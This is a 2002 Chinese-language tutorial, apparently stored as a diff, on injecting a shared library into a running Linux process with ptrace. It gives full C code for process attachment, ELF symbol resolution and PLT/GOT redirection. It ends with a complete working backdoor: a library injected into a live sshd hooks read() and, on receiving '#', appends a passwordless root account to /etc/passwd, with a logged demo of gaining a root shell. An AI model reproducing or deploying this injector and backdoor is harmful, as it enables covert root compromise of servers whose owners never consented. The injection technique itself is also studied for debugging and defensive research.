@@ -1,0 +1,786 @@
+共享库注入--injectso实例
+共享库注射--injectso实例
+
+
+作者：grip2 <gript2@hotmail.com>
+日期：2002/08/16
+
+
+内容：
+    1 -- 介绍
+    2 -- injectso -- 共享库注射技术
+    3 -- injectso的工作步骤及实现方法
+    4 -- 目标进程调试函数
+    5 -- 符号解析函数
+    6 -- 一个简单的后门程序
+    7 -- 最后
+    8 -- 参考文献
+
+
+
+ 一、 ** 介绍
+
+本文介绍的是injectso技术，重点是使用现有技术去实际的完成一个injectso程序，
+而不是侧重于理论上的探讨。这里希望你在阅读这篇文章的时候对ELF、inject有一
+定的了解，当然你也可以选择在看完本文之后再去翻看相关的资料，也许这样能使你
+更有针对性。需要说明的是，下面介绍的技术和给出的函数都是特定于X86下的linux
+的，在其它环境下可能有一些需要改变的细节，但从基本的概念和步骤上讲应该是相
+同的。
+
+[separator]
+
+
+ 二、 **　injectso -- 共享库注射技术
+
+使用injectso技术，我们可以注射共享库到一个运行期进程，这里注射的意思就是通
+过某种操作使我们的.so共享库在指定的进程中被装载，这样再配合上函数重定向或
+其它技术，我们就可以捕获或改变目标进程的行为，可以做非常多的工作。同其它
+inject技术相比，injectso的一些优点是：
+1. 简单 -- 仅仅通过C代码就可以完成所有的工作；
+2. 扩展性好 -- 在基础代码完成之后,如果要对程序功能进行增加、修改，仅需改动
+.so共享库即可；
+3. 干净 -- 对目标进程进行注射之后，不需要留下磁盘文件，使用的程序及共享库
+都可以删除；
+4. 灵活 -- 我们可以使用它完成很多工作，例如：运行期补丁、后门程序等；
+5. 目标服务不需要重新启动；
+6. 无须改动二进制文件；
+7. 可以通过pax, openwall等这样的核心补丁。
+
+
+ 三、 ** injectso的工作步骤及实现方法
+
+完成injectso需要以下几个步骤：
+1. 关联到目标进程；
+2. 发现装载共享库的函数，一般是_dl_open调用，我们将使用它装载我们的.so共享
+库
+3. 装载指定的.so；
+4. 做我们想做的，一般是通过函数重定向来完成我们需要的功能;
+5. 脱离进程；
+
+下面简单介绍一下这几个步骤的实现方法，由于我们是对其它进程进行操作，因此
+ptrace这个linux调试API函数将频繁的被我们使用，在<四>中，我将给出一些ptrace
+包装函数。
+
+步骤1 -- 关联进程
+简单的调用ptrace(PTRACE_ATTACH,...)即可以关联到目标进程，但此后我们还
+需调用waitpid()函数等待目标进程暂停，以便我们进行后续操作。详见<四>中给出
+的ptrace_attach()函数。
+
+步骤2 -- 发现_dl_open
+通过遍历动态连接器使用的link_map结构及其指向的相关链表，我们可以完成
+_dl_open的符号解析工作，关于通过link_map解析符号在phrack59包的p59_08（见参
+考文献）中有详细的描述。
+
+步骤3 -- 装载.so
+    由于在2中我们已经找到_dl_open的地址，所以我们只需将此函数使用的参数添
+入相应的寄存器，并将进程的eip指向_dl_open即可，在此过程中还需做一些其它操
+作，具体内容见<四>中的call_dl_open和ptrace_call函数。
+
+步骤4 -- 函数重定向
+    我们需要做的仅仅是找到相关的函数地址，用新函数替换旧函数，并将旧函数的
+地址保存。其中涉及到了PLT和RELOCATION,关于它们的详细内容你应该看ELF规范中
+的介绍，在<四>中的函数中有PLT和RELOCATION的相关操作，而且在最后的例子中，
+我们将实现函数重定向。关于函数重定向，相关资料很多，这里不再多介绍。
+
+步骤5 -- 脱离进程
+简单的调用ptrace(PTRACE_DETACH,...)可以脱离目标进程。
+
+
+ 四、** 目标进程调试函数
+
+在linux中，如果我们要调试一个进程，可以使用ptrace API函数，为了使用起来更
+方便，我们需要对它进行一些功能上的封装。
+在p59_08中作者给出了一些对ptrace进行封装的函数，但是那太少了，在下面我给出
+了更多的函数，这足够我们使用了。要注意在这些函数中我并未进行太多的错误检测
+，但做为一个例子使用，它已经能很好的工作了，在最后的例子中你将能看到这一点
+。
+
+/* 关联到进程 */
+void ptrace_attach(int pid)
+{
+    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+        perror("ptrace_attach");
+        exit(-1);
+    }
+
+    waitpid(pid, NULL, WUNTRACED);   
+   
+    ptrace_readreg(pid, &oldregs);
+}
+
+/* 进程继续 */
+void ptrace_cont(int pid)
+{
+    int stat;
+
+    if(ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
+        perror("ptrace_cont");
+        exit(-1);
+    }
+
+    while(!WIFSTOPPED(stat))
+        waitpid(pid, &stat, WNOHANG);
+}
+
+/* 脱离进程 */
+void ptrace_detach(int pid)
+{
+    ptrace_writereg(pid, &oldregs);
+
+    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
+        perror("ptrace_detach");
+        exit(-1);
+    }
+}
+
+/* 写指定进程地址 */
+void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
+{
+    int count;
+    long word;
+
+    count = 0;
+
+    while(count < len) {
+        memcpy(&word, vptr + count, sizeof(word));
+        word = ptrace(PTRACE_POKETEXT, pid, addr + count, word);
+        count += 4;
+
+        if(errno != 0)
+            printf("ptrace_write failed\t %ld\n", addr + count);
+    }
+}
+
+/* 读指定进程 */
+void ptrace_read(int pid, unsigned long addr, void *vptr, int len)
+{
+    int i,count;
+    long word;
+    unsigned long *ptr = (unsigned long *)vptr;
+
+    i = count = 0;
+
+    while (count < len) {
+        word = ptrace(PTRACE_PEEKTEXT, pid, addr + count, NULL);
+        count += 4;
+        ptr[i++] = word;
+    }
+}
+
+/*
+ 在进程指定地址读一个字符串
+ */
+char * ptrace_readstr(int pid, unsigned long addr)
+{
+    char *str = (char *) malloc(64);
+    int i,count;
+    long word;
+    char *pa;
+
+    i = count = 0;
+    pa = (char *)&word;
+
+    while(i <= 60) {
+        word = ptrace(PTRACE_PEEKTEXT, pid, addr + count, NULL);
+        count += 4;
+
+        if (pa[0] == '\0') {
+            str[i] = '\0';
+        break;
+        }
+        else
+            str[i++] = pa[0];
+
+        if (pa[1] == '\0') {
+            str[i] = '\0';
+            break;
+        }
+        else
+            str[i++] = pa[1];
+
+        if (pa[2] == '\0') {
+            str[i] = '\0';
+            break;
+        }
+        else
+            str[i++] = pa[2];
+
+        if (pa[3] == '\0') {
+            str[i] = '\0';
+            break;
+        }
+        else
+            str[i++] = pa[3];
+    }
+   
+    return str;
+}
+
+/* 读进程寄存器 */
+void ptrace_readreg(int pid, struct user_regs_struct *regs)
+{
+    if(ptrace(PTRACE_GETREGS, pid, NULL, regs))
+        printf("*** ptrace_readreg error ***\n");
+
+}
+
+/* 写进程寄存器 */
+void ptrace_writereg(int pid, struct user_regs_struct *regs)
+{
+    if(ptrace(PTRACE_SETREGS, pid, NULL, regs))
+        printf("*** ptrace_writereg error ***\n");
+}
+
+/*
+ 将指定数据压入进程堆栈并返回堆栈指针
+ */
+void * ptrace_push(int pid, void *paddr, int size)
+{
+    unsigned long esp;
+    struct user_regs_struct regs;
+
+    ptrace_readreg(pid, &regs);
+    esp = regs.esp;
+    esp -= size;
+    esp = esp - esp % 4;
+    regs.esp = esp;
+
+    ptrace_writereg(pid, &regs);
+
+    ptrace_write(pid, esp, paddr, size);
+
+    return (void *)esp;
+}
+
+/*
+ 在进程内调用指定地址的函数
+ */
+void ptrace_call(int pid, unsigned long addr)
+{
+    void *pc;
+    struct user_regs_struct regs;
+    int stat;
+    void *pra;
+
+    pc = (void *) 0x41414140;
+    pra = ptrace_push(pid, &pc, sizeof(pc));
+
+    ptrace_readreg(pid, &regs);
+    regs.eip = addr;
+    ptrace_writereg(pid, &regs);
+
+    ptrace_cont(pid);
+
+    while(!WIFSIGNALED(stat))
+        waitpid(pid, &stat, WNOHANG);
+}
+
+上面给出的函数很简单，我想不需要更多的说明。但是，还有两个地方我想简单说一
+下，第一个是在关联进程的函数和脱离进程的函数中对寄存器的操作是必须的，在注
+射共享库的操作最后，我们需要恢复目标进程的寄存器内容，以使目标进程正常的恢
+复到运行状态。第二个是在ptrace_call中的这处：
+    pc = (void *) 0x41414140;
+    pra = ptrace_push(pid, &pc, sizeof(pc));
+在这里，我们将无效页面地址0x41414140压入目标进程堆栈，这样当程序执行完我们
+指定的函数后，程序会产生错误中断，所以我们就又获得了对进程的控制权，可以继
+续下面的操作。
+
+
+ 五、** 符号解析函数
+
+因为我们需要对进程中的函数调用进行重定向，所以需要对一些函数符号进行解析。
+下面给出了一些解析符号的函数，你可能会发现有些变量没有定义，这是因为它们是
+全局变量，变量的类型应该很容易确定，如果你需要使用这些函数，只要简单声明全
+局变量即可，如果有问题，也可与我联系。这些函数同样没有太多的错误检测，但是
+作为例子，它们已足够良好的运行了。其中ELF相关的内容你也许不是很清楚，我想
+认真阅读ELF规范对你很有帮助，结合ELF与下面的实例你应该能很快的理解符号解析
+
+/*
+ 取得指向link_map链表首项的指针
+ */
+#define IMAGE_ADDR 0x08048000
+struct link_map * get_linkmap(int pid)
+{
+    Elf32_Ehdr *ehdr = (Elf32_Ehdr *) malloc(sizeof(Elf32_Ehdr));       
+    Elf32_Phdr *phdr = (Elf32_Phdr *) malloc(sizeof(Elf32_Phdr));
+    Elf32_Dyn  *dyn =  (Elf32_Dyn *) malloc(sizeof(Elf32_Dyn));
+    Elf32_Word got;
+    struct link_map *map = (struct link_map *)
+                                    malloc(sizeof(struct link_map));
+    int i = 0;
+
+    ptrace_read(pid, IMAGE_ADDR, ehdr, sizeof(Elf32_Ehdr));
+    phdr_addr = IMAGE_ADDR + ehdr->e_phoff;
+    printf("phdr_addr\t %p\n", phdr_addr);
+
+    ptrace_read(pid, phdr_addr, phdr, sizeof(Elf32_Phdr));
+    while(phdr->p_type != PT_DYNAMIC)
+        ptrace_read(pid, phdr_addr += sizeof(Elf32_Phdr), phdr,
+                                                      sizeof(Elf32_Phdr));
+    dyn_addr = phdr->p_vaddr;
+    printf("dyn_addr\t %p\n", dyn_addr);
+
+    ptrace_read(pid, dyn_addr, dyn, sizeof(Elf32_Dyn));
+    while(dyn->d_tag != DT_PLTGOT) {
+        ptrace_read(pid, dyn_addr + i * sizeof(Elf32_Dyn), dyn, sizeof(Elf32_Dyn));
+        i++;
+    }
+
+    got = (Elf32_Word)dyn->d_un.d_ptr;
+    got += 4;
+    printf("GOT\t\t %p\n", got);
+
+    ptrace_read(pid, got, &map_addr, 4);
+    printf("map_addr\t %p\n", map_addr);
+    ptrace_read(pid, map_addr, map, sizeof(struct link_map));
+   
+    free(ehdr);
+    free(phdr);
+    free(dyn);
+
+    return map;
+}
+
+/*
+ 取得给定link_map指向的SYMTAB、STRTAB、HASH、JMPREL、PLTRELSZ、RELAENT、RELENT信息
+ 这些地址信息将被保存到全局变量中，以方便使用
+ */
+void get_sym_info(int pid, struct link_map *lm)
+{
+    Elf32_Dyn *dyn = (Elf32_Dyn *) malloc(sizeof(Elf32_Dyn));
+    unsigned long dyn_addr;
+
+    dyn_addr = (unsigned long)lm->l_ld;
+   
+    ptrace_read(pid, dyn_addr, dyn, sizeof(Elf32_Dyn));
+    while(dyn->d_tag != DT_NULL){
+        switch(dyn->d_tag)
+        {
+        case DT_SYMTAB:
+            symtab = dyn->d_un.d_ptr;
+            //puts("DT_SYMTAB");
+            break;
+        case DT_STRTAB:
+            strtab = dyn->d_un.d_ptr;
+            //puts("DT_STRTAB");
+            break;
+        case DT_HASH:
+            ptrace_read(pid, dyn->d_un.d_ptr + lm->l_addr + 4,
+                                                           &nchains, sizeof(nchains));
+            //puts("DT_HASH");
+            break;
+        case DT_JMPREL:
+            jmprel = dyn->d_un.d_ptr;
+            //puts("DT_JMPREL");
+            break;
+        case DT_PLTRELSZ:
+            //puts("DT_PLTRELSZ");
+            totalrelsize = dyn->d_un.d_val;
+            break;
+        case DT_RELAENT:
+            relsize = dyn->d_un.d_val;
+            //puts("DT_RELAENT");
+            break;
+        case DT_RELENT:
+            relsize = dyn->d_un.d_val;
+            //puts("DT_RELENT");
+            break;
+        }
+
+        ptrace_read(pid, dyn_addr += sizeof(Elf32_Dyn), dyn, sizeof(Elf32_Dyn));
+    }
+
+    nrels = totalrelsize / relsize;
+
+    free(dyn);
+}
+
+/*
+ 解析指定符号
+ */
+unsigned long  find_symbol(int pid, struct link_map *map, char *sym_name)
+{
+    struct link_map *lm = (struct link_map *) malloc(sizeof(struct link_map));
+    unsigned long sym_addr;
+    char *str;
+   
+    sym_addr = find_symbol_in_linkmap(pid, map, sym_name);
+    if (sym_addr)
+        return sym_addr;
+
+    if (!map->l_next) return 0;
+
+    ptrace_read(pid, (unsigned long)map->l_next, lm, sizeof(struct link_map));
+    sym_addr = find_symbol_in_linkmap(pid, lm, sym_name);
+    while(!sym_addr && lm->l_next) {
+        ptrace_read(pid, (unsigned long)lm->l_next, lm, sizeof(struct link_map));
+
+        str = ptrace_readstr(pid, (unsigned long)lm->l_name);
+        if(str[0] == '\0')
+            continue;
+        printf("[%s]\n", str);
+        free(str);
+
+        if ((sym_addr = find_symbol_in_linkmap(pid, lm, sym_name)))
+            break;
+    }
+
+    return sym_addr;
+}
+
+/*
+ 在指定的link_map指向的符号表查找符号，它仅仅是被上面的find_symbol使用
+ */
+unsigned long  find_symbol_in_linkmap(int pid, struct link_map *lm, char *sym_name)
+{
+    Elf32_Sym *sym = (Elf32_Sym *) malloc(sizeof(Elf32_Sym));
+    int i;
+    char *str;
+    unsigned long ret;
+
+    get_sym_info(pid, lm);
+   
+    for(i = 0; i < nchains; i++) {
+        ptrace_read(pid, symtab + i * sizeof(Elf32_Sym), sym, sizeof(Elf32_Sym));
+
+        if (!sym->st_name || !sym->st_size || !sym->st_value)
+            continue;
+
+/*    因为我还要通过此函数解析非函数类型的符号，因此将此处封上了
+        if (ELF32_ST_TYPE(sym->st_info) != STT_FUNC)
+            continue;
+*/
+        str = (char *) ptrace_readstr(pid, strtab + sym->st_name);
+        if (strcmp(str, sym_name) == 0) {
+            free(str);
+            str = ptrace_readstr(pid, (unsigned long)lm->l_name);
+            printf("lib name [%s]\n", str);
+            free(str);
+            break;
+        }
+        free(str);
+    }
+
+
+    if (i == nchains)
+        ret = 0;
+    else
+        ret =  lm->l_addr + sym->st_value;
+
+    free(sym);
+
+    return ret;
+}
+
+/* 查找符号的重定位地址 */
+unsigned long  find_sym_in_rel(int pid, char *sym_name)
+{
+    Elf32_Rel *rel = (Elf32_Rel *) malloc(sizeof(Elf32_Rel));
+    Elf32_Sym *sym = (Elf32_Sym *) malloc(sizeof(Elf32_Sym));
+    int i;
+    char *str;
+    unsigned long ret;
+
+    get_dyn_info(pid);
+    for(i = 0; i< nrels ;i++) {
+        ptrace_read(pid, (unsigned long)(jmprel + i * sizeof(Elf32_Rel)),
+                                                                 rel, sizeof(Elf32_Rel));
+        if(ELF32_R_SYM(rel->r_info)) {
+            ptrace_read(pid, symtab + ELF32_R_SYM(rel->r_info) *
+                                               sizeof(Elf32_Sym), sym, sizeof(Elf32_Sym));
+            str = ptrace_readstr(pid, strtab + sym->st_name);
+            if (strcmp(str, sym_name) == 0) {
+                free(str);
+                break;
+            }
+            free(str);
+        }
+    }
+
+    if (i == nrels)
+        ret = 0;
+    else
+        ret =  rel->r_offset;
+
+    free(rel);
+
+    return ret;
+}
+
+/*
+ 在进程自身的映象中（即不包括动态共享库，无须遍历link_map链表）获得各种动态信息
+ */
+void get_dyn_info(int pid)
+{
+    Elf32_Dyn *dyn = (Elf32_Dyn *) malloc(sizeof(Elf32_Dyn));
+    int i = 0;
+
+    ptrace_read(pid, dyn_addr + i * sizeof(Elf32_Dyn), dyn, sizeof(Elf32_Dyn));
+    i++;
+    while(dyn->d_tag){
+        switch(dyn->d_tag)
+        {
+        case DT_SYMTAB:
+            puts("DT_SYMTAB");
+            symtab = dyn->d_un.d_ptr;
+            break;
+        case DT_STRTAB:
+            strtab = dyn->d_un.d_ptr;
+            //puts("DT_STRTAB");
+            break;
+        case DT_JMPREL:
+            jmprel = dyn->d_un.d_ptr;
+            //puts("DT_JMPREL");
+            printf("jmprel\t %p\n", jmprel);
+            break;
+        case DT_PLTRELSZ:
+            totalrelsize = dyn->d_un.d_val;
+            //puts("DT_PLTRELSZ");
+            break;
+        case DT_RELAENT:
+            relsize = dyn->d_un.d_val;
+            //puts("DT_RELAENT");
+            break;
+        case DT_RELENT:
+            relsize = dyn->d_un.d_val;
+            //puts("DT_RELENT");
+            break;
+        }
+
+        ptrace_read(pid, dyn_addr + i * sizeof(Elf32_Dyn), dyn, sizeof(Elf32_Dyn));
+        i++;
+    }
+
+    nrels = totalrelsize / relsize;
+
+    free(dyn);
+}
+
+上面的函数可能较<四>中的复杂了一些，但是它们也是容易理解的，这需要你对ELF
+有一定的了解，我无法在这里解释更多的关于ELF内容，最好的和最有效的办法是你
+去阅读规范，文后的参考文献中给出了下载地址。
+
+
+ 六、** 一个简单的后门程序
+
+有了上面介绍的函数，现在我们可以很容易的编写出injectso程序，下面让我们来写
+一个简单后门程序。首先，我们回想一下前面介绍的injectso工作步骤，看看我们是
+否已经有足够的辅助函数来完成它。第1步，我们可以调用上面给出的ptrace_attach()
+完成。第2步，可以通过find_symbol()找到_dl_open的地址。第3步我们可以调用
+ptrace_call()来调用_dl_open，但是要注意_dl_open定义为'internal_function'，
+这说明它的传递方式是通过寄存器而不是堆栈，这样看来在调用_dl_open之前还需做一
+些琐碎的操作，那么我们还是把它封装起来更好。第4步，函数重定向，我们可以通过
+符号解析函数和RELOCATION地址获取函数找到新老函数地址，地址都已经找到，那替换
+它们只是一个简单的操作了。第5步，仅仅调用ptrace_detach就可以了。OK，看来所有
+的步骤我们都可以很轻松的完成了，只有3还需要个小小的封装函数，现在就来完成它：
+
+void call_dl_open(int pid, unsigned long addr, char *libname)
+{
+    void *pRLibName;
+    struct user_regs_struct regs;
+
+    /*
+      先找个空间存放要装载的共享库名，我们可以简单的把它放入堆栈
+     */
+    pRLibName = ptrace_push(pid, libname, strlen(libname) + 1);
+
+    /* 设置参数到寄存器 */
+    ptrace_readreg(pid, &regs);
+    regs.eax = (unsigned long) pRLibName;
+    regs.ecx = 0x0;
+    regs.edx = RTLD_LAZY;
+    ptrace_writereg(pid, &regs);
+
+    /* 调用_dl_open */
+    ptrace_call(pid, addr);
+    puts("call _dl_open ok");
+}
+
+到这里所有的基础问题都已经解决（只是相对而言，在有些情况下可能需要解决系统
+调用或临界区等问题，本文没有涉及，但是我们的程序依然可以很好的执行），现在
+需要考虑的我们做一个什么样的后门程序。为了简单，我打算作一个注射SSH服务的
+后门程序。我们只需要重定向read调用到我们自己的newread，并在newread中加入对
+读取到的内容进行判断的语句，如果发现读到的第一个字节是#号，我们将向/etc/passwd
+追加新行"injso::0:0:root:/root:/bin/sh\n"，这样我们就有了一个具
+有ROOT权限的用户injso,并且不需要登陆密码。根据这个思路来建立我们的.so:
+
+[root@grip2 injectso]# cat so.c
+#include <sys/types.h>
+#include <stdio.h>
+
+ssize_t  (*oldread)(int fd, void *buf, size_t count);
+
+ssize_t  newread(int fd, void *buf, size_t count)
+{
+    ssize_t ret;
+    FILE *fp;
+    char ch = '#';   
+
+    ret = oldread(fd, buf, count);   
+
+    if (memcmp(buf, (void *)&ch, 1) == 0) {
+        fp = fopen("/etc/passwd", "a");
+        fputs("injso::0:0:root:/root:/bin/sh\n", fp);
+        fclose(fp);
+    }
+
+    return ret;
+}
+我们来编译它
+[root@grip2 injectso]# gcc -shared -o so.so -fPIC so.c -nostdlib
+
+好了，我们已经有了.so，下面就仅剩下main()了，让我们来看看：
+[root@grip2 injectso]# cat injso.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include "p_elf.h"
+#include "p_dbg.h"
+
+int main(int argc, char *argv[])
+{
+    int pid;
+    struct link_map *map;
+    char sym_name[256];
+    unsigned long sym_addr;
+    unsigned long new_addr,old_addr,rel_addr;
+
+    /* 从命令行取得目标进程PID
+    pid = atoi(argv[1]);
+
+    /* 关联到目标进程 */
+    ptrace_attach(pid);
+   
+    /* 得到指向link_map链表的指针 */
+    map = get_linkmap(pid);                    /* get_linkmap */
+
+    /* 发现_dl_open，并调用它 */
+    sym_addr = find_symbol(pid, map, "_dl_open");        /* call _dl_open */
+    printf("found _dl_open at addr %p\n", sym_addr);   
+    call_dl_open(pid, sym_addr, "/home/grip2/me/so.so");    /* 注意装载的库地址 */   
+   
+
+    /* 找到我们的新函数newread的地址 */
+    strcpy(sym_name, "newread");                /* intercept */
+    sym_addr = find_symbol(pid, map, sym_name);
+    printf("%s addr\t %p\n", sym_name, sym_addr);
+
+    /* 找到read的RELOCATION地址 */
+    strcpy(sym_name, "read");               
+    rel_addr = find_sym_in_rel(pid, sym_name);
+    printf("%s rel addr\t %p\n", sym_name, rel_addr);
+
+    /* 找到用于保存read地址的指针 */
+    strcpy(sym_name, "oldread");      
+    old_addr = find_symbol(pid, map, sym_name);
+    printf("%s addr\t %p\n", sym_name, old_addr);
+
+    /* 函数重定向 */
+    puts("intercept...");                    /* intercept */
+    ptrace_read(pid, rel_addr, &new_addr, sizeof(new_addr));
+    ptrace_write(pid, old_addr, &new_addr, sizeof(new_addr));
+    ptrace_write(pid, rel_addr, &sym_addr, sizeof(sym_addr));
+    puts("injectso ok");
+
+    /* 脱离进程 */
+    ptrace_detach(pid);
+
+    exit(0);
+}
+
+现在所有的工作都已经做好，你需要的是把上面介绍的函数都写到自己的.c程序文件
+中，这样就可以编译了,我们来编译它
+[root@grip2 injectso]# gcc -o injso injso.c p_dbg.c p_elf.c -Wall
+[root@grip2 injectso]# ls
+injso injso.c make p_dbg.c p_dbg.h p_elf.c p_elf.h so.c so.so
+
+ok,启动ssh服务，并开始注射
+[root@grip2 injectso]# /usr/sbin/sshd
+[root@grip2 injectso]# ps -aux|grep sshd
+root       763  0.0  0.4  2676 1268 ?        S    21:46   0:00 /usr/sbin/sshd
+root      1567  0.0  0.2  2004  688 pts/0    S    21:57   0:00 grep sshd
+[root@grip2 injectso]# ./injso 763
+phdr_addr     0x8048034
+dyn_addr     0x8084c2c
+GOT         0x80847d8
+map_addr     0x40016998
+[/lib/libdl.so.2]
+[/usr/lib/libz.so.1]
+[/lib/libnsl.so.1]
+[/lib/libutil.so.1]
+[/lib/libcrypto.so.2]
+[/lib/i686/libc.so.6]
+lib name [/lib/i686/libc.so.6]
+found _dl_open at addr 0x402352e0
+call _dl_open ok
+[/lib/libdl.so.2]
+[/usr/lib/libz.so.1]
+[/lib/libnsl.so.1]
+[/lib/libutil.so.1]
+[/lib/libcrypto.so.2]
+[/lib/i686/libc.so.6]
+[/lib/ld-linux.so.2]
+[/home/grip2/me/so.so]
+lib name [/home/grip2/me/so.so]
+newread addr     0x40017574
+DT_SYMTAB
+jmprel     0x804ac9c
+read rel addr     0x8084bc0
+[/lib/libdl.so.2]
+[/usr/lib/libz.so.1]
+[/lib/libnsl.so.1]
+[/lib/libutil.so.1]
+[/lib/libcrypto.so.2]
+[/lib/i686/libc.so.6]
+[/lib/ld-linux.so.2]
+[/home/grip2/me/so.so]
+lib name [/home/grip2/me/so.so]
+oldread addr     0x40018764
+intercept...
+new_addr 0x401fc530
+injectso ok
+
+注射成功，测试一下，看看效果，可以在任何机器上telnet被注射机的22端口，
+并传送一个#号
+$ telnet 127.0.0.1 22
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+SSH-1.99-OpenSSH_2.9p2
+#         <-------------------我们输入#号，并回车
+Protocol mismatch.
+Connection closed by foreign host.
+
+看看后门是否起作用了，登陆系统：
+localhost login: injso
+Last login: Sat Aug 17 21:58:40 from :0
+sh-2.05#
+OK，得到了ROOT，测试成功。
+
+
+七、** 最后
+
+在学习injectso的过程中，我阅读了一些相关的资料，但是我发现可能是由于injectso中
+涉及到的某些技术已经非常成熟和普及，因此很难找到一个从整体上完整的描述injectso
+的文章，你能发现的是很多的文章都只是对其中的某一个技术环节进行探讨，这样对初学
+者而言，就不容易去完整的理解injectso，也就不能很快的去应用它。为了扫除这个障碍，
+我写了这篇文章，当然由于水平有限，文章的重点也仅仅是放在提供一点思路帮助你去快
+速的建立一个injectso上，而对相关的技术没有深入的探讨，不是不可以在这里介绍，而
+是感觉实在是有点班门弄斧，更好的技术文章很多，象injectso3.ppt就很不错，我建议你
+去仔细的阅读它。
+
+最后，如果您对本文有什么意见或建议，请EMAIL给我，我也很希望知道您的看法。
+希望更多的交流 -- E-mail <gript2@hotmail.com>
+
+
+八 ** 参考文献
+
+http://packetstormsecurity.nl/mag/phrack/phrack59.tar.gz
+
+http://www.blackhat.com/presentations/bh-europe-01/shaun-clowes/injectso3.ppt
+
+ftp://tsx.mit.edu/pub/linux/packages/GCC/ELF.doc.tar.gz
+
+http://www.big.net.au/~silvio/lib-redirection.txt
+
+http://online.securityfocus.com/data/library/subversiveld.pdf
